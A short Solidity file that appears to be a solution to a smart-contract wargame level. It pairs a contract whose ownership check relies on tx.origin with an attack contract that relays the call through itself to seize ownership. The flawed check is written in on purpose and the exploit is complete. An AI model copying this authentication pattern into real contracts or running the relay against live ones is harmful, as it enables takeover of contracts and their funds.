// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// import "hardhat/console.sol";

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    // console.log("tx.origin : ", tx.origin);
    // console.log("msg.sender : ", msg.sender);
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract HackTelephone {
  Telephone t;
  constructor(
    address _t
  ) {
    t = Telephone(_t);
  }

  function changeOwner(address _owner) public {
    t.changeOwner(_owner);
  }
}